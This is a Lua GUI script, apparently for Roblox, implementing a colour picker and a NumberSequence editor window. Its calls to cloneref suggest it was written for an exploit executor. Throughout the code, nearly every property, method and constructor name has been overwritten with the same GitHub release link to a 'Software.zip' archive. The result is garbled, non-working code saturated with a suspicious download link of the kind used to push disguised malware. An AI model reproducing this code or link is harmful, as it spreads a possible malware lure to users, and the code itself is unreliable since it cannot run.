			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,25,0,18)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(55,55,55)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

			local row = 0
			local column = 0
			for i,v in pairs(basicColors) do
				local newColor = colorChoice:Clone()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = v
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1 + 30*column,0,21 + 23*row)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
					red,green,blue = v.r,v.g,v.b
					local newColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(red,green,blue)
					hue,sat,val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newColor)
					updateColor()
				end)	

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = basicColorsFrame
				column = column + 1
				if column == 6 then row = row + 1 column = 0 end
			end

			row = 0
			column = 0
			for i = 1,12 do
				local color = customColors[i] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
				local newColor = colorChoice:Clone()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = color
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1 + 30*column,0,20 + 23*row)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
					local curColor = customColors[i] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
					red,green,blue = curColor.r,curColor.g,curColor.b
					hue,sat,val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(curColor)
					updateColor()
				end)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
					customColors[i] = chosenColor
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = chosenColor
				end)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = customColorsFrame
				column = column + 1
				if column == 6 then row = row + 1 column = 0 end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(chosenColor) window:Close() end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.4 end end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0 end end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() window:Close() end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.4 end end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0 end end)

			updateColor()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,color)
				red,green,blue = color.r,color.g,color.b
				hue,sat,val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(color)
				updateColor()
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end

			return newMt
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local function new() -- TODO: Convert to newer class model
			local newMt = setmetatable({},{})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			local guiContents = create({
				{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,ClipsDescendants=true,Name="Content",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-20),}},
				{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Time",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,40,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,60,0,20),}},
				{3,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),ClipsDescendants=true,Font=3,Name="Input",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,58,0,20),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{4,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Time",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{5,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Font=3,Name="Close",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-90,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,0,20),Text="Close",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{6,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Font=3,Name="Reset",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-180,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,0,20),Text="Reset",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{7,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Font=3,Name="Delete",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,380,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,0,20),Text="Delete",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{8,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Name="NumberLineOutlines",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,170),}},
				{9,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Name="NumberLine",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,170),}},
				{10,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Value",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,170,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,60,0,20),}},
				{11,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={10},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Value",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{12,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),ClipsDescendants=true,Font=3,Name="Input",Parent={10},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,58,0,20),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{13,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Envelope",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,300,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,60,0,20),}},
				{14,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),ClipsDescendants=true,Font=3,Name="Input",Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,58,0,20),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{15,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Envelope",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
			})
			local window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			window:Resize(680,265)
			window:SetTitle("NumberSequence Editor")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = window
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i,v in pairs(guiContents:GetChildren()) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
			local gui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerGui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerTopBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local numberLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local numberLineOutlines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local timeBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local valueBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local envelopeBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local deleteButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local resetButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local closeButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local topClose = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local points = {{1,0,3},{8,0.05,1},{5,0.6,2},{4,0.7,4},{6,1,4}}
			local lines = {}
			local eLines = {}
			local beginPoint = points[1]
			local endPoint = points[#points]
			local currentlySelected = nil
			local currentPoint = nil
			local resetSequence = nil

			local user = cloneref(game["Run Service"].Parent:GetService("UserInputService"))
			local mouse = cloneref(game["Run Service"].Parent:GetService("Players")).LocalPlayer:GetMouse()

			for i = 2,10 do
				local newLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(96/255,96/255,96/255)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((i-1)/(11-1),0,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLineOutlines
			end

			for i = 2,4 do
				local newLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(96/255,96/255,96/255)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,(i-1)/(5-1),0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLineOutlines
			end

			local lineTemp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1)

			local sequenceLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,0)

			for i = 1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
				local line = sequenceLine:Clone()
				eLines[i] = line
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "E"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(i)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(199/255,44/255,28/255)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,i-1,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLine
			end

			for i = 1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
				local line = sequenceLine:Clone()
				lines[i] = line
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(i)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,i-1,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLine
			end

			local envelopeDrag = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 2
			local envelopeDragLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame",envelopeDrag)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Line"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 2

			local envelopeDragTop,envelopeDragBottom = envelopeDrag:Clone(),envelopeDrag:Clone()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLine
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLine

			local function buildSequence()
				local newPoints = {}
				for i,v in pairs(points) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPoints,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(v[2],v[1],v[3]))
				end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPoints)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			end

			local function round(num,places)
				local multi = 10^places
				return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num*multi + 0.5)/multi
			end

			local function updateInputs(point)
				if point then
					currentPoint = point
					local rawT,rawV,rawE = point[2],point[1],point[3]
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = round(rawT,(rawT < 0.01 and 5) or (rawT < 0.1 and 4) or 3)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = round(rawV,(rawV < 0.01 and 5) or (rawV < 0.1 and 4) or (rawV < 1 and 3) or 2)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = round(rawE,(rawE < 0.01 and 5) or (rawE < 0.1 and 4) or (rawV < 1 and 3) or 2)

					local envelopeDistance = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*(point[3]/10)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,point[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,point[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,point[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,point[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+envelopeDistance+2)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not currentPoint or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(currentPoint[4].Select) then return end
				local mouseEvent,releaseEvent
				local maxSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				local mouseDelta = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - mouse.Y)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,20)

				releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
					mouseEvent:Disconnect()
					releaseEvent:Disconnect()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,0)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,20)
				end)

				mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local topDiff = (currentPoint[4].AbsolutePosition.Y+2)-(mouse.Y-mouseDelta)-19
						local newEnvelope = 10*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(topDiff,0)/maxSize)
						local maxEnvelope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(currentPoint[1],10-currentPoint[1])
						currentPoint[3] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newEnvelope,maxEnvelope)
						newMt:Redraw()
						buildSequence()
						updateInputs(currentPoint)
					end
				end)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not currentPoint or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(currentPoint[4].Select) then return end
				local mouseEvent,releaseEvent
				local maxSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				local mouseDelta = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - mouse.Y)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,20)

				releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
					mouseEvent:Disconnect()
					releaseEvent:Disconnect()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,0)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,20)
				end)

				mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local bottomDiff = (mouse.Y+(20-mouseDelta))-(currentPoint[4].AbsolutePosition.Y+2)-19
						local newEnvelope = 10*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(bottomDiff,0)/maxSize)
						local maxEnvelope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(currentPoint[1],10-currentPoint[1])
						currentPoint[3] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newEnvelope,maxEnvelope)
						newMt:Redraw()
						buildSequence()
						updateInputs(currentPoint)
					end
				end)
			end)

			local function placePoint(point)
				local newPoint = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Point"
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) * point[2])-2,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*(10-point[1])/10-2)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)

				local newSelect = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Select"
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(199/255,44/255,28/255)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-2,0,-2)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,9,0,9)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newPoint

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = numberLine

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						for i,v in pairs(points) do v[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1 end
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
						updateInputs(point)
					end
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not currentlySelected then
						currentPoint = point
						local mouseEvent,releaseEvent
						currentlySelected = true
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(249/255,191/255,59/255)

						local oldEnvelope = point[3]

						releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
